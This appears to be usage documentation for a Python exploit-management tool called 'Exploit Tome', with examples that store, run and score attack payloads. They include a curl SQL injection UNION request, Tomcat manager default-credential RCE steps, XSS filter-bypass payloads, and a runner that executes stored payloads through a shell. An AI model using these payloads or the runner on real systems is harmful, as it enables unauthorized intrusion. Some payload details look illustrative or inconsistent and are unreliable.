# ðŸ“š Exploit Tome - Practical Examples

## Example 1: Adding SQL Injection Exploit

### Via GUI
1. Open "ðŸ“š Exploit Tome" tab
2. Click "âž• Add/Edit Exploit"
3. Fill in:
   - **Name**: WordPress Plugin SQL Injection (Vulnerable Plugin)
   - **Category**: SQL Injection
   - **Target URL**: http://target.com/wp-admin/admin-ajax.php?action=vulnerable_action
   - **Payload**:
     ```bash
     curl -X POST "http://target.com/wp-admin/admin-ajax.php?action=vulnerable_action" \
       -d "param=1 UNION SELECT 1,2,user(),4,5-- -" \
       -H "User-Agent: Mozilla/5.0"
     ```
   - **Notes**: Works on WordPress 5.0-5.8 with XYZ plugin < 2.3
   - **CVE IDs**: CVE-2024-12345
   - **Tags**: wordpress, plugin, critical, auth-bypass
   - **References**: https://exploit-db.com/exploits/52345

4. Click "ðŸ’¾ Save Exploit"

### Exploit Appears With:
- âœ… Green success rate indicator (0% initially)
- âœ… Searchable by name, category, tags
- âœ… Full payload visible on click
- âœ… Creation timestamp recorded

---

## Example 2: RCE Exploit via API

```python
from exploit_tome import ExploitTome, ExploitEntry
from datetime import datetime

# Initialize
tome = ExploitTome()

# Create RCE exploit
rce_exploit = ExploitEntry(
    id="tomcat_rce_001",
    name="Apache Tomcat Manager RCE",
    category="Remote Code Execution",
    target="http://target.com:8080/manager/html",
    payload="""
# Exploitation steps:
# 1. Brute force manager credentials (default: tomcat/tomcat)
# 2. Upload malicious WAR file
# 3. Deploy and access at /malicious-app

curl -u tomcat:tomcat \
  -F "deployConfig=@app.config" \
  -F "dbDriver=org.postgresql.Driver" \
  http://target.com:8080/manager/text/deploy?path=/pwned
""",
    notes="Works on default installations, check /manager/html accessibility first",
    cve_ids=["CVE-2024-50379"],
    references=[
        "https://nvd.nist.gov/vuln/detail/CVE-2024-50379",
        "https://exploit-db.com/exploits/52567"
    ],
    tags=["java", "tomcat", "rce", "default-creds"],
    created_at=datetime.now().isoformat()
)

# Save to tome
tome.add_exploit(rce_exploit)

# Verify saved
saved = tome.get_exploit("tomcat_rce_001")
print(f"Saved exploit: {saved.name}")
```

---

## Example 3: Tracking Successful Exploitation

```python
from exploit_tome import ExploitTome

tome = ExploitTome()

# After executing exploit...
target_url = "http://192.168.1.100:8080/manager/html"
exploit_id = "tomcat_rce_001"

# Log success
tome.log_execution(
    exploit_id=exploit_id,
    target_url=target_url,
    result="success",
    response="<html>Deployment successful</html>",
    error=""
)

# Check updated stats
exploit = tome.get_exploit(exploit_id)
print(f"Success rate: {exploit.get_success_rate():.1f}%")
print(f"Success count: {exploit.success_count}")
print(f"Last used: {exploit.last_used}")
```

---

## Example 4: Using Collections for Campaign Organization

### Scenario: Penetration Test of "ACME Corp"

```python
from exploit_tome import ExploitTome

tome = ExploitTome()

# Create collection for campaign
tome.create_collection(
    name="ACME Corp Pentest 2024",
    description="Q1 2024 pentest of ACME Corp infrastructure"
)

# Add relevant exploits to collection
acme_exploits = [
    "wordpress_rce_001",
    "tomcat_rce_001",
    "mysql_default_creds_001",
    "nginx_misconfig_001"
]

for exploit_id in acme_exploits:
    tome.add_to_collection("ACME Corp Pentest 2024", exploit_id)

# Later, view all exploits used in this campaign
campaign_exploits = tome.get_collection_exploits("ACME Corp Pentest 2024")
print(f"Exploits used in campaign: {len(campaign_exploits)}")
for exploit in campaign_exploits:
    print(f"  - {exploit.name} (Success rate: {exploit.get_success_rate():.0f}%)")
```

---

## Example 5: Searching for Effective Exploits

```python
from exploit_tome import ExploitTome

tome = ExploitTome()

# Find all SQL injection exploits with high success rate
sql_exploits = tome.search_exploits("sql")

# Filter to only working ones
working = [e for e in sql_exploits if e.get_success_rate() >= 80]

print(f"Found {len(working)} highly effective SQL injection exploits:")
for exploit in working:
    print(f"  - {exploit.name}: {exploit.get_success_rate():.0f}% success")
    print(f"    Target: {exploit.target}")
    print(f"    Last used: {exploit.last_used}")
```

---

## Example 6: Backup and Restore

### Backup for External Storage

```python
from exploit_tome import ExploitTome

tome = ExploitTome()

# Export all exploits to JSON
tome.export_to_json("exploit_library_backup_2024.json")

# Later, on another machine...
tome_new = ExploitTome("new_machine_tome.db")
count = tome_new.import_from_json("exploit_library_backup_2024.json")
print(f"Imported {count} exploits to new machine")
```

---

## Example 7: Statistics for Campaign Review

```python
from exploit_tome import ExploitTome
import json

tome = ExploitTome()

# Get comprehensive statistics
stats = tome.get_statistics()

print(f"""
=== EXPLOITATION STATISTICS ===
Total Exploits: {stats['total_exploits']}
Overall Success Rate: {stats['overall_success_rate']:.1f}%

By Status:
{json.dumps(stats['by_status'], indent=2)}

By Category:
{json.dumps(stats['by_category'], indent=2)}

Top Performing Exploits:
""")

for exploit in stats['most_successful'][:5]:
    print(f"  {exploit['name']}: {exploit['count']} successes")
```

---

## Example 8: XSS Payload Collection

### Adding Multiple XSS Variants

```python
from exploit_tome import ExploitTome, ExploitEntry
from datetime import datetime

tome = ExploitTome()

xss_payloads = [
    {
        "name": "Basic XSS Alert Box",
        "payload": "<script>alert('XSS')</script>",
        "target": "http://target.com/search.php?q=",
        "notes": "Simple payload, often filtered"
    },
    {
        "name": "Image XSS Bypass",
        "payload": "<img src=x onerror=alert('XSS')>",
        "target": "http://target.com/profile.php?bio=",
        "notes": "Bypasses <script> tag filters"
    },
    {
        "name": "SVG XSS Bypass",
        "payload": "<svg/onload=alert('XSS')>",
        "target": "http://target.com/status.php?msg=",
        "notes": "Effective for SVG context filters"
    }
]

for idx, payload_data in enumerate(xss_payloads):
    exploit = ExploitEntry(
        id=f"xss_{idx:03d}",
        name=payload_data["name"],
        category="Cross-Site Scripting (XSS)",
        target=payload_data["target"],
        payload=payload_data["payload"],
        notes=payload_data["notes"],
        tags=["xss", "web", "trivial"],
        created_at=datetime.now().isoformat()
    )
    tome.add_exploit(exploit)

print(f"Added {len(xss_payloads)} XSS exploits to Tome")
```

---

## Example 9: Integration with External Testing Framework

```python
from exploit_tome import ExploitTome
import subprocess
import json

class ExploitFramework:
    def __init__(self):
        self.tome = ExploitTome()
    
    def test_exploit_against_target(self, exploit_id: str, target_url: str):
        """Execute exploit and log results"""
        
        # Get exploit from tome
        exploit = self.tome.get_exploit(exploit_id)
        if not exploit:
            return {"error": "Exploit not found"}
        
        # Execute exploit (example: shell command)
        try:
            result = subprocess.run(
                exploit.payload,
                capture_output=True,
                text=True,
                timeout=10,
                shell=True
            )
            
            success = result.returncode == 0
            
            # Log execution
            self.tome.log_execution(
                exploit_id=exploit_id,
                target_url=target_url,
                result="success" if success else "failure",
                response=result.stdout[:500],
                error=result.stderr[:500]
            )
            
            return {
                "success": success,
                "stdout": result.stdout[:200],
                "stderr": result.stderr[:200]
            }
        except Exception as e:
            # Log failure
            self.tome.log_execution(
                exploit_id=exploit_id,
                target_url=target_url,
                result="failure",
                error=str(e)
            )
            return {"error": str(e)}

# Usage
framework = ExploitFramework()

# Test exploit
result = framework.test_exploit_against_target(
    "wordpress_rce_001",
    "http://target.com/wp-admin/"
)

print(result)
```

---

## Example 10: Filtering Exploits by Criteria

```python
from exploit_tome import ExploitTome

tome = ExploitTome()

# Get active exploits
active = tome.get_all_exploits(status="active")
print(f"Active exploits: {len(active)}")

# Get SQL injection exploits
sql = tome.get_all_exploits(category="SQL Injection")
print(f"SQL injection exploits: {len(sql)}")

# Custom filter: Find untested exploits
all_exploits = tome.get_all_exploits()
untested = [e for e in all_exploits if e.success_count + e.fail_count == 0]
print(f"Untested exploits: {len(untested)}")

# Find high-success exploits ready for client demo
production_ready = [
    e for e in all_exploits 
    if e.get_success_rate() >= 90 and e.success_count >= 5
]
print(f"Production-ready exploits: {len(production_ready)}")
for exploit in production_ready:
    print(f"  - {exploit.name}: {exploit.success_count} confirmed successes")
```

---

## Example 11: Cloning and Adapting Exploits

```python
from exploit_tome import ExploitTome, ExploitEntry
from datetime import datetime

tome = ExploitTome()

# Get base exploit
base = tome.get_exploit("tomcat_rce_001")

# Create variant for different version
variant = ExploitEntry(
    id="tomcat_rce_002",
    name=f"{base.name} (Version 8.5.x)",
    category=base.category,
    target=base.target,
    payload=base.payload.replace("8080", "8081"),  # Different port
    notes=f"{base.notes} - Modified for v8.5.x",
    tags=base.tags + ["v8.5.x"],
    cve_ids=base.cve_ids,
    references=base.references,
    created_at=datetime.now().isoformat()
)

tome.add_exploit(variant)
print(f"Created variant: {variant.name}")
```

---

## Example 12: Exporting for Reporting

```python
from exploit_tome import ExploitTome
import json

tome = ExploitTome()

# Get statistics for report
stats = tome.get_statistics()

# Export for documentation
report = {
    "title": "Pentesting Results - ACME Corp",
    "date": "2024-01-15",
    "statistics": {
        "total_exploits_used": stats['total_exploits'],
        "overall_success_rate": f"{stats['overall_success_rate']:.1f}%",
        "by_category": stats['by_category'],
        "top_exploits": stats['most_successful']
    },
    "exploits_list": []
}

# Add each exploit
for exploit in tome.get_all_exploits(status="active"):
    report["exploits_list"].append({
        "name": exploit.name,
        "category": exploit.category,
        "target": exploit.target,
        "success_rate": f"{exploit.get_success_rate():.0f}%",
        "executions": exploit.success_count + exploit.fail_count,
        "cves": exploit.cve_ids
    })

# Save report
with open("pentesting_report.json", "w") as f:
    json.dump(report, f, indent=2)

print("Report saved to pentesting_report.json")
```

---

## Quick Reference Commands

### Python API Cheat Sheet

```python
from exploit_tome import ExploitTome, ExploitEntry

tome = ExploitTome()

# Create
tome.add_exploit(exploit_entry)
tome.create_collection("name")

# Read
exploit = tome.get_exploit("id")
exploits = tome.get_all_exploits()
results = tome.search_exploits("term")
stats = tome.get_statistics()

# Update
tome.update_exploit("id", success_count=10, status="active")
tome.log_execution("id", "target_url", "success")

# Delete
tome.delete_exploit("id")

# Collections
tome.add_to_collection("collection", "exploit_id")
tome.get_collection_exploits("collection")

# Import/Export
tome.export_to_json("file.json")
tome.import_from_json("file.json")

# History
history = tome.get_execution_history("id", limit=20)

# Categories
categories = tome.get_categories()
```

---

These examples demonstrate the full power of the Exploit Tome for managing your active exploits!
